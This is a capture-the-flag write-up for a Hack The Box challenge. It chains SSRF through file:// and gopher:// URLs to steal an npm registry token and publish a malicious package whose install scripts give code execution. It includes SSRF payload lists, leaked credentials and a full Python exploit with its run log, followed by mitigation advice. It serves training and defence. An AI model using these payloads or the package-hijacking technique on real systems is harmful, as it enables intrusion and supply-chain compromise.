# Prison Pipeline

| Field | Value |
|-------|-------|
| **Challenge** | Prison Pipeline |
| **Category** | Misc |
| **Difficulty** | Medium |
| **Points** | 975 |
| **Platform** | Hack The Box |
| **Author** | L27Sen |
| **Date** | January 5, 2026 |

---

## Challenge Description

> One of our crew members has been captured by mutant raiders and is locked away in their heavily fortified prison. During an initial reconnaissance, the crew managed to gain access to the prison's record management system. Your mission: exploit this system to infiltrate the prison's network and disable the defenses for the rescuers. Can you orchestrate the perfect escape and rescue your comrade before it's too late?

**Target:** `94.237.61.249:43680`

**Provided Files:**
- Full application source code
- Dockerfile and configuration files
- Private npm package (`prisoner-db`)

---

## Goal / Objective

The objective is to exploit the prison's record management system to gain code execution on the server and retrieve the flag. The flag is stored in `/root/flag` and can only be read via a SUID binary `/readflag`.

---

## Initial Analysis & Reconnaissance

### Application Architecture

The challenge provides a complete Docker environment with the following components:

```
challenge/
├── application/          # Express.js web application (port 5000)
│   ├── index.js
│   ├── routes/index.js
│   └── package.json
├── prisoner-db/          # Private npm package
│   ├── index.js
│   ├── curl.js
│   └── package.json
config/
├── verdaccio.yaml        # Private npm registry config
├── cronjob.sh            # Auto-update script
├── readflag.c            # SUID binary source
└── supervisord.conf
```

### Technology Stack

| Component | Technology | Version |
|-----------|------------|---------|
| Runtime | Node.js | 21.7.3 |
| Web Framework | Express.js | 4.17.1 |
| Template Engine | Nunjucks | 3.2.4 |
| HTTP Client | node-libcurl | 4.0.0 |
| YAML Parser | js-yaml | 4.1.0 |
| Package Registry | Verdaccio | Latest |

### Key Observations

1. **Private NPM Registry**: A Verdaccio instance runs on `localhost:4873` serving a private `prisoner-db` package

2. **Cronjob Auto-Update**: A background script checks for package updates every 30 seconds:
```bash
while true; do
    OUTDATED=$(npm --registry $REGISTRY_URL outdated $PACKAGE_NAME)
    if [[ -n "$OUTDATED" ]]; then
        npm --registry $REGISTRY_URL update $PACKAGE_NAME
        pm2 restart prison-pipeline
    fi
    sleep 30
done
```

3. **SUID Binary**: The flag is only readable via `/readflag` binary with SUID bit set:
```c
#include<unistd.h>
#include<stdlib.h>
int main() {
    setuid(0);
    system("cat /root/flag");
}
```

4. **node-libcurl**: The application uses `node-libcurl` for HTTP requests, which supports multiple protocols including `file://` and `gopher://`

---

## Attack Surface Identification

### API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Main page |
| `/api/prisoners` | GET | List all prisoners |
| `/api/prisoners/:id` | GET | Get prisoner by ID |
| `/api/prisoners/import` | POST | **Import prisoner from URL** |

### Critical Code Path

The `/api/prisoners/import` endpoint accepts a URL and fetches data using `node-libcurl`:

```javascript
// routes/index.js
router.post('/api/prisoners/import', async (req, res, next) => {
    const { url } = req.body;
    if (!url) {
        return res.status(400).json(response('Missing URL parameter'));
    };
    try {
        let prisoner_id = await db.importPrisoner(url);
        return res.json({
            'message': 'Prisoner data imported successfully',
            'prisoner_id': prisoner_id
        });
    }
    catch(e) {
        return res.status(500).json(response('Failed to import prisoner data'));
    }
});
```

The `importPrisoner` function uses a curl wrapper:

```javascript
// prisoner-db/index.js
async importPrisoner(url) {
    try {
        const getResponse = await curl.get(url);
        const xmlData = getResponse.body;
        const id = `PIP-${Math.floor(100000 + Math.random() * 900000)}`;
        const prisoner = { id: id, data: xmlData };
        this.addPrisoner(prisoner);
        return id;
    }
    catch (error) {
        console.error('Error importing prisoner:', error);
        return false;
    }
}
```

### Verdaccio Configuration

```yaml
packages:
  'prisoner-*':
    access: $all
    publish: $authenticated
    # proxy: npmjs  <-- Disabled, no external lookup

auth:
  htpasswd:
    file: ./htpasswd
    max_users: -1
```

Key findings:
- `prisoner-*` packages require authentication to publish
- Anonymous read access is allowed
- No proxy to npmjs (dependency confusion not possible)

---

## Deep Technical Analysis

### Initial SSRF Testing (Failed Attempts)

My first approach was to test basic SSRF capabilities via the import endpoint:

```bash
$ wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import \
    -H "Content-Type: application/json" \
    -d '{"url":"http://localhost:4873/"}'
{"message":"500 internal server error"}

$ wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import \
    -H "Content-Type: application/json" \
    -d '{"url":"http://localhost:4873/prisoner-db"}'
{"message":"500 internal server error"}

$ wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import \
    -H "Content-Type: application/json" \
    -d '{"url":"https://httpbin.org/robots.txt"}'
{"message":"500 internal server error"}

$ wsl curl -s -X POST http://94.237.61.249:43680/api/prisoners/import \
    -H "Content-Type: application/json" \
    -d '{"url":"file:///etc/passwd"}'
{"message":"500 internal server error"}
```

All direct curl commands from PowerShell returned 500 errors. This was misleading and initially made me think the SSRF was blocked.

### Python Script Approach (Success)

I created a Python script to systematically test SSRF vectors:

```python
#!/usr/bin/env python3
import requests

TARGET = "http://94.237.61.249:43680"

def test_ssrf():
    payloads = [
        "file:///etc/passwd",
        "file:///app/package.json",
        "file:///home/node/.config/verdaccio/htpasswd",
        "file:///home/node/.npmrc",
        "http://localhost:4873/",
        "gopher://localhost:4873/_test",
    ]
    
    for payload in payloads:
        r = requests.post(
            f"{TARGET}/api/prisoners/import",
            json={"url": payload},
            timeout=10
        )
        print(f"[*] Testing {payload}: {r.status_code} - {r.text[:100]}")
```

**Results:**

```
[*] Testing file:///etc/passwd: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-460581"}
[*] Testing file:///app/package.json: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-205254"}
[*] Testing file:///home/node/.config/verdaccio/htpasswd: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-572842"}
[*] Testing file:///home/node/.npmrc: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-651363"}
[*] Testing http://localhost:4873/: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-731332"}
[*] Testing gopher://localhost:4873/_test: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-116822"}
```

**Critical Discovery:** The `file://` and `gopher://` protocols work! The SSRF is fully functional.

### Reading Sensitive Files via SSRF

Once imported, files can be read by querying the prisoner endpoint:

```bash
$ wsl bash -c "curl -s 'http://94.237.61.249:43680/api/prisoners/PIP-572842'"
{"id":"PIP-572842","raw":"registry:vXehhNUoMMrxM:autocreated 2024-05-19T02:54:21.220Z\n"}
```

This is the Verdaccio htpasswd file containing the registry user credentials.

### NPM Auth Token Discovery

The most critical file was `/home/node/.npmrc`:

```bash
$ curl -s 'http://94.237.61.249:43680/api/prisoners/PIP-651363'
```

**Content:**
```
//localhost:4873/:_authToken="MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ=="
```

This is a valid Bearer token that can be used to authenticate with the Verdaccio registry!

### Package Metadata Analysis

Reading the Verdaccio storage revealed the current package version:

```json
{
    "name": "prisoner-db",
    "versions": {
        "1.0.0": {
            "name": "prisoner-db",
            "version": "1.0.0",
            "dist": {
                "tarball": "http://localhost:4873/prisoner-db/-/prisoner-db-1.0.0.tgz"
            }
        }
    },
    "dist-tags": {
        "latest": "1.0.0"
    }
}
```

The current version is `1.0.0`. To trigger the auto-update mechanism, we need to publish version `1.0.1` or higher.

---

## Vulnerability / Weakness Explanation

The application contains a **chained vulnerability** leading to **Remote Code Execution via Supply Chain Attack**:

| # | Vulnerability | CWE | Impact |
|---|--------------|-----|--------|
| 1 | SSRF via node-libcurl | CWE-918 | Read internal files, access internal services |
| 2 | Sensitive Data Exposure | CWE-200 | NPM auth token leaked |
| 3 | Gopher Protocol SSRF | CWE-918 | Arbitrary HTTP requests to internal services |
| 4 | Supply Chain Attack | CWE-829 | RCE via malicious package |

### Root Cause

1. **Unrestricted URL schemes**: The `node-libcurl` library supports `file://` and `gopher://` protocols without validation
2. **Credential storage**: NPM auth token stored in plaintext in `.npmrc`
3. **Auto-update mechanism**: Cronjob blindly installs updated packages without verification
4. **NPM lifecycle scripts**: `postinstall` scripts execute with application privileges

---

## Exploitation Strategy

The attack chain:

```
┌─────────────────────────────────────────────────────────────────────┐
│  1. SSRF (file://) → Read /home/node/.npmrc → Get Auth Token        │
├─────────────────────────────────────────────────────────────────────┤
│  2. Craft malicious prisoner-db@1.0.1 package with RCE payload      │
├─────────────────────────────────────────────────────────────────────┤
│  3. SSRF (gopher://) → PUT request to Verdaccio → Publish package   │
├─────────────────────────────────────────────────────────────────────┤
│  4. Wait for cronjob → npm update → postinstall script executes     │
├─────────────────────────────────────────────────────────────────────┤
│  5. /readflag executed → Flag written to /app/static/flag.txt       │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Exploit Implementation

### Full Exploit Script

```python
#!/usr/bin/env python3
"""
Prison Pipeline CTF Exploit
Attack: Supply Chain Attack via SSRF + NPM Package Hijacking
"""

import requests
import json
import base64
import io
import tarfile
import hashlib
import urllib.parse
import time

TARGET = "http://94.237.61.249:43680"
AUTH_TOKEN = "MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ=="

def create_malicious_package():
    """Create a malicious prisoner-db npm package tarball"""
    
    # Package.json with postinstall script to execute /readflag
    package_json = {
        "name": "prisoner-db",
        "version": "1.0.1",
        "description": "Database interface for prisoners of Prison-Pipeline.",
        "main": "index.js",
        "scripts": {
            "preinstall": "/readflag > /app/static/images/flag.txt || true",
            "postinstall": "/readflag > /app/static/flag.txt || true"
        },
        "dependencies": {
            "js-yaml": "^4.1.0",
            "node-libcurl": "4.0.0"
        }
    }
    
    # Minimal working index.js
    index_js = '''const fs = require('fs');
const yaml = require('js-yaml');

// Execute readflag on require
try {
    const { execSync } = require('child_process');
    const flag = execSync('/readflag').toString();
    fs.writeFileSync('/app/static/flag.txt', flag);
} catch(e) {}

class Database {
    constructor(repository) { this.repository = repository; }
    listPrisonersIds() { return []; }
    getPrisoners() { return []; }
    getPrisoner(id) { return {}; }
    addPrisoner(prisoner) { return true; }
    async importPrisoner(url) { return "PIP-000000"; }
}
module.exports = Database;
'''

    # Create tarball
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
        # Add package.json
        pkg_data = json.dumps(package_json, indent=2).encode()
        pkg_info = tarfile.TarInfo(name='package/package.json')
        pkg_info.size = len(pkg_data)
        tar.addfile(pkg_info, io.BytesIO(pkg_data))
        
        # Add index.js
        idx_data = index_js.encode()
        idx_info = tarfile.TarInfo(name='package/index.js')
        idx_info.size = len(idx_data)
        tar.addfile(idx_info, io.BytesIO(idx_data))
    
    return tar_buffer.getvalue()

def create_npm_publish_body(version="1.0.1"):
    """Create the JSON body for npm publish request"""
    
    tarball = create_malicious_package()
    tarball_b64 = base64.b64encode(tarball).decode()
    
    sha512 = hashlib.sha512(tarball).digest()
    integrity = "sha512-" + base64.b64encode(sha512).decode()
    shasum = hashlib.sha1(tarball).hexdigest()
    
    publish_body = {
        "_id": "prisoner-db",
        "name": "prisoner-db",
        "dist-tags": {"latest": version},
        "versions": {
            version: {
                "name": "prisoner-db",
                "version": version,
                "main": "index.js",
                "scripts": {
                    "postinstall": "/readflag > /app/static/flag.txt || true"
                },
                "dist": {
                    "integrity": integrity,
                    "shasum": shasum,
                    "tarball": f"http://localhost:4873/prisoner-db/-/prisoner-db-{version}.tgz"
                }
            }
        },
        "_attachments": {
            f"prisoner-db-{version}.tgz": {
                "content_type": "application/octet-stream",
                "data": tarball_b64,
                "length": len(tarball)
            }
        }
    }
    
    return json.dumps(publish_body)

def create_gopher_payload():
    """Create gopher:// payload to publish malicious package"""
    
    body = create_npm_publish_body()
    
    # Build HTTP PUT request for Verdaccio publish API
    http_request = f"PUT /prisoner-db HTTP/1.1\r\n"
    http_request += f"Host: localhost:4873\r\n"
    http_request += f"Authorization: Bearer {AUTH_TOKEN}\r\n"
    http_request += f"Content-Type: application/json\r\n"
    http_request += f"Content-Length: {len(body)}\r\n"
    http_request += f"Connection: close\r\n"
    http_request += f"\r\n"
    http_request += body
    
    # URL encode for gopher protocol
    encoded = urllib.parse.quote(http_request, safe='')
    gopher_url = f"gopher://localhost:4873/_{encoded}"
    
    return gopher_url

def exploit():
    print("[*] Prison Pipeline Exploit - Supply Chain Attack")
    print("[*] Creating malicious package...")
    
    gopher_url = create_gopher_payload()
    print(f"[*] Gopher URL length: {len(gopher_url)}")
    
    print("\n[*] Sending SSRF request to publish malicious package...")
    
    r = requests.post(
        f"{TARGET}/api/prisoners/import",
        json={"url": gopher_url},
        timeout=60
    )
    print(f"[*] Response: {r.status_code} - {r.text}")
    
    print("\n[*] Waiting for cronjob (runs every 30 seconds)...")
    
    for i in range(12):
        time.sleep(5)
        print(f"[*] Checking for flag... ({(i+1)*5}s)")
        
        try:
            r = requests.get(f"{TARGET}/static/flag.txt", timeout=5)
            if r.status_code == 200 and "HTB{" in r.text:
                print(f"\n[+] FLAG FOUND:")
                print(r.text)
                return True
        except:
            pass
    
    return False

if __name__ == "__main__":
    exploit()
```

### Execution

```bash
$ wsl bash -c "python3 exploit_full.py"
[*] Prison Pipeline Exploit - Supply Chain Attack
[*] Creating malicious package...
[*] Gopher URL length: 3216
[*] First 200 chars of payload: gopher://localhost:4873/_PUT%20%2Fprisoner-db%20HTTP%2F1.1%0D%0AHost%3A%20localhost%3A4873%0D%0AAuthorization%3A%20Bearer%20MWZlMmI1OTRiZjMw...

[*] Sending SSRF request to publish malicious package...
[*] Response: 200 - {"message":"Prisoner data imported successfully","prisoner_id":"PIP-585472"}

[*] Waiting for cronjob to install malicious package (up to 60 seconds)...
[*] Checking for flag... (5s)
[*] Checking for flag... (10s)
[*] Checking for flag... (15s)
[*] Checking for flag... (20s)
[*] Checking for flag... (25s)

[+] FLAG FOUND at /static/flag.txt:
HTB{pr1s0n_br34k_w1th_supply_ch41n!_39f2976ce32e6f43823a69d477d10a01}
```

---

## Flag Retrieval

```
HTB{pr1s0n_br34k_w1th_supply_ch41n!_39f2976ce32e6f43823a69d477d10a01}
```

---

## Mitigation / Lessons Learned

### For Developers

| Issue | Mitigation |
|-------|------------|
| Unrestricted SSRF | Whitelist allowed URL schemes (http/https only) |
| Credential exposure | Use environment variables, not config files |
| Auto-update mechanism | Implement package signature verification |
| NPM lifecycle scripts | Disable with `--ignore-scripts` flag |
| SUID binaries | Avoid SUID; use capabilities instead |

### Recommended Fixes

```javascript
// URL validation before fetching
const ALLOWED_PROTOCOLS = ['http:', 'https:'];
const parsedUrl = new URL(url);
if (!ALLOWED_PROTOCOLS.includes(parsedUrl.protocol)) {
    throw new Error('Invalid URL protocol');
}

// Block internal IPs
const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0'];
if (BLOCKED_HOSTS.includes(parsedUrl.hostname)) {
    throw new Error('Internal hosts not allowed');
}
```

### Security Best Practices

1. **Never store credentials in files** accessible to the application
2. **Validate and sanitize all user input**, especially URLs
3. **Disable dangerous protocols** in HTTP client libraries
4. **Implement package integrity verification** for auto-updates
5. **Use principle of least privilege** - avoid running as privileged users

---

## Conclusion

This challenge demonstrated a sophisticated supply chain attack combining:

1. **SSRF with dangerous protocols** (`file://`, `gopher://`) to read sensitive files and make internal requests
2. **Credential theft** via exposed `.npmrc` auth token
3. **Package hijacking** by publishing a malicious version to the private registry
4. **RCE via npm lifecycle scripts** triggered by automated package updates

The key insight was recognizing that `node-libcurl` supports multiple protocols beyond HTTP, and the `gopher://` protocol can be weaponized to send arbitrary HTTP requests to internal services.

**Skills Demonstrated:**
- SSRF exploitation with protocol smuggling
- npm/Verdaccio internals understanding
- Supply chain attack methodology
- Python exploit development

---

*Write-up by L27Sen | HTB Prison Pipeline | January 2026*
